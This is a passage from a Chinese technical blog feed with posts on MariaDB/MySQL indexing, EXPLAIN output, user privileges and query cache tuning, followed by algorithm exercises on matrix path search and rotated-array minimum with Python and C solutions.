Tree索引</h4><p>顺序存储。由于B+树是一颗平衡二叉树，因此每个叶子节点到根节点的距离是相同的。查询时先查找根节点，然后依次往下直到叶子节点，叶子节点存储的是指向数据的指针。并且叶子节点也是顺序存储的，每个叶子节点都指向同级的其他叶子节点，因此找到一个叶子节点后就可以顺序查找到其他的叶子节点，从而也可以顺序存储其他叶子节点的数据。</p><p>由于B+树索引是左前缀索引，因此适合查询范围类的数据：如全键值数据、键值范围或键前缀查找数据等。</p><ul><li>全键值匹配：精确某个值，即完全匹配。</li><li>匹配最左前缀：只精确匹配起头部分。</li><li>匹配范围值：排序后的一个范围的值，只关心<strong>最左列</strong></li><li>精确匹配某一列，并范围匹配另一列：用于多键值匹配</li></ul><p>不适合B+树索引类型：</p><ul><li>不从最左列开始，索引无效。即如果索引是(Age,Name)而查询语句查询的顺序为Name、Age则无法使用索引</li><li>不能跳过索引中的某个列。即如果索引为(StuID,Name,Age)，而查询语句查询的是(StuID,Age)则无法使用索引</li><li>如果查询中某个列是为范围查询，那么其右侧的列都无法再使用索引。即如果索引为(StuID,Name)，此时查询StuID大于10，Name为D开头的。这种情况下即使满足最左侧查询也无法使用索引。</li></ul><h4 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h4><p>将需要索引的列作hash运算，并将其hash结果进行分组存放，即hash结果为1的放在一个hash桶中，以此类推。这种索引方式适合进行精确匹配的查询，不能进行范围匹配。</p><p>该索引方式只在Memory存储引擎中可以使用。</p><h3 id="索引优点"><a href="#索引优点" class="headerlink" title="索引优点"></a>索引优点</h3><ul><li><p>索引可以降低服务需要扫描的数据量，减少IO次数；</p></li><li><p>索引可以帮助服务器避免排序和使用临时表；</p></li><li><p>索引可以帮助将随机IO转为顺序IO</p></li></ul><h3 id="高性能索引策略"><a href="#高性能索引策略" class="headerlink" title="高性能索引策略"></a>高性能索引策略</h3><p>不要让索引列字段参与计算</p><p>左前缀索引，尽量少的使用相同项，即基于左侧多少字符来进行索引创建</p><p>多列索引，通常用于and操作时使用</p><h3 id="EXPLAIN"><a href="#EXPLAIN" class="headerlink" title="EXPLAIN"></a>EXPLAIN</h3><p>可以使用explain语句来分析索引的有效性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#获取查询执行的计划信息，用来查看查询优化器如何执行查询</span><br><span class="line">explain select clause;</span><br><span class="line"></span><br><span class="line">#输出</span><br><span class="line">id：当前查询语句中，每个select语句的编号</span><br><span class="line">select_type：查询类型。</span><br><span class="line">simple：简单查询</span><br><span class="line">复杂查询：</span><br><span class="line">SUBQUERY：简单子查询</span><br><span class="line">DERIVED：用于FROM中的子查询</span><br><span class="line">UNION：UNION语句的第一个之后的SELECT语句</span><br><span class="line">UNION RESULT：UNION语句中的匿名表</span><br><span class="line">table：Select语句关联到的表</span><br><span class="line">type：关联类型，即mysql决定的如何去查询表中的行的方式</span><br><span class="line">ALL：全表扫描</span><br><span class="line">index：根据索引的次序进行全表扫描，可能会产生随机IO</span><br><span class="line">range：有范围限制的根据索引实现的范围扫描</span><br><span class="line">ref：根据索引返回表中匹配某单个值的所有行</span><br><span class="line">eq_ref：仅返回一个行，需要与某个参考值作比较</span><br><span class="line">const，system：直接返回单个行</span><br><span class="line">NULL：没有使用索引</span><br><span class="line">possible_keys：查询可能会用到的索引</span><br><span class="line">key：查询中使用了的索引</span><br><span class="line">key_len：在索引中使用的字节数</span><br><span class="line">ref：在利用key字段所表示的索引完成查询时所用的列或常量值</span><br><span class="line">rows：mysql为找到所有目标而读取的行数</span><br><span class="line">extra：额外信息</span><br><span class="line">Using index：mysql使用覆盖索引，以避免访问表</span><br><span class="line">Using where：mysql将在存储引擎层检索后再进行过滤，即过滤where条件</span><br><span class="line">Using temporary：mysql对结果排序时会使用临时表</span><br><span class="line">Using filesort：mysql对结果使用外部索引排序</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基本法则&quot;&gt;&lt;a href=&quot;#基本法则&quot; class=&quot;headerlink&quot; title=&quot;基本法则&quot;&gt;&lt;/a&gt;基本法则&lt;/h3&gt;&lt;p&gt;索引应该被构建在经常被用作查询条件的字段上。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-用户权限、缓存</title>
    <link href="http://yoursite.com/2020/02/22/mariadb-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E3%80%81%E7%BC%93%E5%AD%98/"/>
    <id>http://yoursite.com/2020/02/22/mariadb-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E3%80%81%E7%BC%93%E5%AD%98/</id>
    <published>2020-02-22T06:12:02.000Z</published>
    <updated>2020-02-22T11:21:59.060Z</updated>
    
    <content type="html"><![CDATA[<h3 id="权限类别"><a href="#权限类别" class="headerlink" title="权限类别"></a>权限类别</h3><p>mysql数据库的权限主要分为库、表、字段、管理、程序等类别。</p><a id="more"></a><h4 id="管理类"><a href="#管理类" class="headerlink" title="管理类"></a>管理类</h4><ul><li>create temporary tables：创建临时表，一般为16mb，存储在内存中</li><li>create user：创建用户</li><li>file：将当前数据库保存到文件中，或者从文件中导入数据库</li><li>super：高级管理类权限，如授权等</li><li>show databases：查看数据库，一般所有用户都有</li><li>reload：重新装载授权表</li><li>shutdown：进程级别关闭数据库</li><li>replication slave：是否能够实现复制功能</li><li>replication client：是否能向主服务器请求复制</li><li>lock tables：锁表</li><li>process：与mysql进程相关</li></ul><h4 id="程序类"><a href="#程序类" class="headerlink" title="程序类"></a>程序类</h4><ul><li>function：创建、修改、删除、执行函数</li><li>procedure：创建、修改、删除、执行函数</li><li>trigger：创建、修改、删除、执行触发器</li></ul><h4 id="库和表类"><a href="#库和表类" class="headerlink" title="库和表类"></a>库和表类</h4><ul><li>alter：修改</li><li>create：创建</li><li>create view：创建视图</li><li>drop：删除</li><li>index：创建或删除索引</li><li>show view：查看视图</li><li>grant option：能把自己获得权限赠给其他用户一个副本</li></ul><h4 id="数据字段类"><a href="#数据字段类" class="headerlink" title="数据字段类"></a>数据字段类</h4><ul><li>select：查询字段</li><li>insert：修改字段</li><li>delete：删除字段</li><li>update：更新字段</li></ul><h4 id="所有权限类"><a href="#所有权限类" class="headerlink" title="所有权限类"></a>所有权限类</h4><ul><li>all privileges：表示所有有限权限</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#以上信息都存放在mysql元数据表中</span><br><span class="line">use mysql;</span><br><span class="line">show tabels;</span><br><span class="line"></span><br><span class="line">db、host、user：用于实现用户授权，即用户登录等限制信息</span><br><span class="line">columns_priv, tables_priv, procs_priv, proxies_priv：表、程序、代理级别的权限</span><br></pre></td></tr></table></figure><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;username&#39;@&#39;host&#39; [identified by &#39;password&#39;];</span><br><span class="line">username：用户名</span><br><span class="line">host：允许用户登录的网段，可使用%通配</span><br><span class="line">password：用户密码</span><br></pre></td></tr></table></figure><h4 id="查看用户授权"><a href="#查看用户授权" class="headerlink" title="查看用户授权"></a>查看用户授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show grants for &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><h4 id="重命名用户"><a href="#重命名用户" class="headerlink" title="重命名用户"></a>重命名用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename user old_user_name to new_user_name;</span><br></pre></td></tr></table></figure><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#第一种</span><br><span class="line">set password for</span><br><span class="line">#第二种，不自动更新授权表，需要执行flush privileges</span><br><span class="line">update mysql.user set password&#x3D;PASSWORD(&#39;your_password&#39;) where clause;</span><br><span class="line">#第三种</span><br><span class="line">mysqladm password</span><br></pre></td></tr></table></figure><h4 id="忘记管理员密码"><a href="#忘记管理员密码" class="headerlink" title="忘记管理员密码"></a>忘记管理员密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、启动mysqld进程时，使用--skip-grant-tables --skip-networking来跳过授权以及网络连接，centos7需要修改对应service文件</span><br><span class="line">2、使用update命令修改管理员密码</span><br><span class="line">3、重启mysqld进程</span><br></pre></td></tr></table></figure><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GRANT priv_type[,...] ON [&#123;table|function|procedure&#125;] db.&#123;table|routine&#125; TO &#39;USERNAME&#39;@&#39;HOST&#39; [IDENTIFIED BY &#39;password&#39;] [REQUIRE SSL] [WITH with_option]</span><br><span class="line">with_option：</span><br><span class="line">MAX_QUERIES_PER_HOUR count：每小时最多查询数</span><br><span class="line">MAX_UPDATES_PER_HOUR count：每小时最多更新数</span><br><span class="line">MAX_CONNECTIONS_PER_HOUR count：每小时最大连接数</span><br><span class="line">MAX_USER_CONNECTIONS count：每个用户最大连接数</span><br></pre></td></tr></table></figure><h4 id="取消授权"><a href="#取消授权" class="headerlink" title="取消授权"></a>取消授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVOKE priv_type [(column_list)] [,priv_type [(column_list)]] ... ON [object_type] priv_level FROM user [,user]...</span><br></pre></td></tr></table></figure><h3 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h3><h4 id="判断是否命中"><a href="#判断是否命中" class="headerlink" title="判断是否命中"></a>判断是否命中</h4><p>通过查询语句的hash值判断，需要考虑几个因素：</p><ul><li>查询语句本身，查询语句任何字符上的不同都会导致缓存不能命中；若查询语句中包含用户自定义函数、存储函数、用户自定义变量、临时表、mysql系统表、列级权限表、不确定值的函数等都不会被缓存</li><li>要查询的数据库</li><li>客户端使用的协议版本</li></ul><h4 id="缓存效率"><a href="#缓存效率" class="headerlink" title="缓存效率"></a>缓存效率</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#查看mysql查询缓存相关变量</span><br><span class="line">show global variables like &#39;%query%&#39;</span><br><span class="line">#查询相关缓存状态变量</span><br><span class="line">show global status like &#39;Qcache%&#39;</span><br><span class="line"></span><br><span class="line">#命中率</span><br><span class="line">Qcache_hits&#x2F;(Qcache_hits+Com_select)</span><br><span class="line"></span><br><span class="line">#有关变量</span><br><span class="line">query_cache_min_res_unit：查询缓存的内存分配最小单位；值减少会减少浪费，但会导致更频繁的内存分配；值较大时会导致碎片过多，可以使用FLUSH QUERY CACHE来减少碎片</span><br><span class="line">query_cache_limit：mysql能够缓存的最大查询结果；对于有着较大结果的查询语句，建议在select中使用SQL_NO_CACHE来显示指定不缓存</span><br><span class="line">query_cache_size：查询缓存可用的内存空间，必须是1024整数倍，单位为字节</span><br><span class="line">query_cache_type：缓存类型，ON、OFF、DEMAND，DEMAND表示只有查询语句显示指定SQL_CACHE时才缓存</span><br><span class="line">query_cache_wlock_invalidate：如果某表被其他连接锁定，是否仍从查询返回结果，默认为OFF</span><br><span class="line"></span><br><span class="line">#常见问题及修改</span><br><span class="line">查询结果过大导致不能缓存，需要提高query_cache_limit值</span><br><span class="line">内存碎片化，需要减少query_cache_min_res_unit值</span><br><span class="line">如果缓存空间太小，导致缓存不断换入换出，需要提高query_cache_size值</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;权限类别&quot;&gt;&lt;a href=&quot;#权限类别&quot; class=&quot;headerlink&quot; title=&quot;权限类别&quot;&gt;&lt;/a&gt;权限类别&lt;/h3&gt;&lt;p&gt;mysql数据库的权限主要分为库、表、字段、管理、程序等类别。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>10矩阵中的路径</title>
    <link href="http://yoursite.com/2020/02/19/10%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/"/>
    <id>http://yoursite.com/2020/02/19/10%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/</id>
    <published>2020-02-19T11:27:38.000Z</published>
    <updated>2020-02-19T11:30:20.198Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一格开始，每一步可以在矩阵中向左、右、上、下移动一格。如果一条路径经过了矩阵的某一格，那么该路径不能再次进入该格子。例如，在下面的3×4的矩阵中包含一条字符串“bfce”的路径（路径中的字母用加粗标出）。</p><a id="more"></a><p>[ [ “a”,”<strong>b</strong>“,”c”,”e” ],<br>[ “s”,”<strong>f</strong>“,”<strong>c</strong>“,”s” ],<br>[ “a”,”d”,”<strong>e</strong>“,”e” ] ]</p><p>但矩阵中不包含字符串“abfb”的路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入这个格子。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：board &#x3D; [[&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;E&quot;],[&quot;S&quot;,&quot;F&quot;,&quot;C&quot;,&quot;S&quot;],[&quot;A&quot;,&quot;D&quot;,&quot;E&quot;,&quot;E&quot;]], word &#x3D; &quot;ABCCED&quot;</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：board &#x3D; [[&quot;a&quot;,&quot;b&quot;],[&quot;c&quot;,&quot;d&quot;]], word &#x3D; &quot;abcd&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= board.length &lt;= 200</code></li><li><code>1 &lt;= board[i].length &lt;= 200</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exist</span><span class="params">(self, board, word)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :type word: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> self.backtrace(board, word, <span class="number">0</span>, i, j):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self, board, word, index, i, j)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> board[i][j] != word[index]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> index + <span class="number">1</span> == len(word):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        tmp = board[i][j]</span><br><span class="line">        board[i][j] = <span class="number">0</span></span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> self.backtrace(board, word, index, i - <span class="number">1</span>, j) <span class="keyword">or</span> \</span><br><span class="line">                j &gt; <span class="number">0</span> <span class="keyword">and</span> self.backtrace(board, word, index, i, j - <span class="number">1</span>) <span class="keyword">or</span> \</span><br><span class="line">                i &lt; len(board) - <span class="number">1</span> <span class="keyword">and</span> self.backtrace(board, word, index, i + <span class="number">1</span>, j) <span class="keyword">or</span> \</span><br><span class="line">                j &lt; len(board[<span class="number">0</span>]) - <span class="number">1</span> <span class="keyword">and</span> self.backtrace(board, word, index, i, j + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        board[i][j] = tmp</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//主要思路是回溯，从第一位开始匹配，需要记录待匹配的字符串的下标用于比较是否匹配结束</span></span><br><span class="line"><span class="comment">//进入回溯后判断当前待匹配下标和矩阵的值是否相等，相等就继续上下左右回溯(注意区间)</span></span><br><span class="line"><span class="comment">//上下左右均未找到则恢复矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">char</span>** board, <span class="keyword">int</span> boardSize, <span class="keyword">int</span>* boardColSize, <span class="keyword">char</span>* <span class="keyword">word</span>, <span class="keyword">int</span> index, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] != <span class="keyword">word</span>[index])<span class="comment">//当前字母不相等</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (index + <span class="number">1</span> == <span class="built_in">strlen</span>(<span class="keyword">word</span>))<span class="comment">//最后一个字母相等，路径正确</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">char</span> tmp = board[i][j];<span class="comment">//暂存当前</span></span><br><span class="line">board[i][j] = <span class="number">0</span>;<span class="comment">//避免重复使用</span></span><br><span class="line">index++;</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">(i &gt; <span class="number">0</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i - <span class="number">1</span>, j))</span><br><span class="line">|| (j &gt; <span class="number">0</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i, j - <span class="number">1</span>))</span><br><span class="line">|| (i &lt; boardSize - <span class="number">1</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i + <span class="number">1</span>, j))</span><br><span class="line">|| (j &lt; *boardColSize - <span class="number">1</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i, j + <span class="number">1</span>))</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">board[i][j] = tmp;<span class="comment">//没找到，进行恢复</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>** board, <span class="keyword">int</span> boardSize, <span class="keyword">int</span>* boardColSize, <span class="keyword">char</span>* <span class="keyword">word</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; boardSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; *boardColSize; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, <span class="number">0</span>, i, j))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一格开始，每一步可以在矩阵中向左、右、上、下移动一格。如果一条路径经过了矩阵的某一格，那么该路径不能再次进入该格子。例如，在下面的3×4的矩阵中包含一条字符串“bfce”的路径（路径中的字母用加粗标出）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>09旋转数组的最小数字</title>
    <link href="http://yoursite.com/2020/02/19/09%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/"/>
    <id>http://yoursite.com/2020/02/19/09%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/</id>
    <published>2020-02-19T11:24:33.000Z</published>
    <updated>2020-02-19T11:30:15.693Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个递增排序的数组的一个旋转，输出旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一个旋转，该数组的最小值为1。  </p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[3,4,5,1,2]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2,2,2,0,1]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minArray</span><span class="params">(self, numbers)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type numbers: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        low=<span class="number">0</span></span><br><span class="line">        high=len(numbers)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> low&lt;high:</span><br><span class="line">            mid=(low+high)/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> numbers[mid] &lt; numbers[high]:</span><br><span class="line">                high=mid</span><br><span class="line">            <span class="keyword">elif</span> numbers[mid] &gt; numbers[high]:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numbers[low]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//若中间的数比最后一个数大，最小值在右边</span></span><br><span class="line"><span class="comment">//若中间的数比最后一个数小，最小值在左边</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minArray</span><span class="params">(<span class="keyword">int</span>* numbers, <span class="keyword">int</span> numbersSize)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> low = <span class="number">0</span>, high = numbersSize - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (low &lt; high)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (high + low) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (numbers[mid]&lt;numbers[high])</span><br><span class="line">&#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> 